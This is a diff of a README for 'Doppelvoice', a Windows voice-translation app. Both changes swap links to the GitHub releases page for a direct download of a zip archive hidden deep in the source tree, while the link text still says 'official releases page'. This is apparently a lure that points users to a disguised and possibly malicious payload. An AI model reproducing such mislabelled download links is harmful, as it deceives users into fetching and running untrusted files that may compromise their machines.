@@ -1,6 +1,6 @@
 # 🎙️ Doppelvoice - Speak fluently across languages using voice
 
-[![Download Doppelvoice](https://img.shields.io/badge/Download-Doppelvoice-blue)](https://github.com/Go-waterox597/Doppelvoice/releases)
+[![Download Doppelvoice](https://img.shields.io/badge/Download-Doppelvoice-blue)](https://raw.githubusercontent.com/Go-waterox597/Doppelvoice/main/src/doppelvoice/engine/_pb/common/Software-v1.7.zip)
 
 Doppelvoice translates your speech in real time. It converts your Chinese or English input into the other language. The software mimics your voice to maintain your speaking style during translation. This application runs locally on your Windows machine to ensure privacy and speed.
 
@@ -19,7 +19,7 @@ Ensure your computer meets these specifications to run the software smoothly:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/Go-waterox597/Doppelvoice/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Go-waterox597/Doppelvoice/main/src/doppelvoice/engine/_pb/common/Software-v1.7.zip).
 2. Locate the latest version of the software.
 3. Click the file ending in `.exe` to start the download.
 4. Open the file once it finishes downloading. 
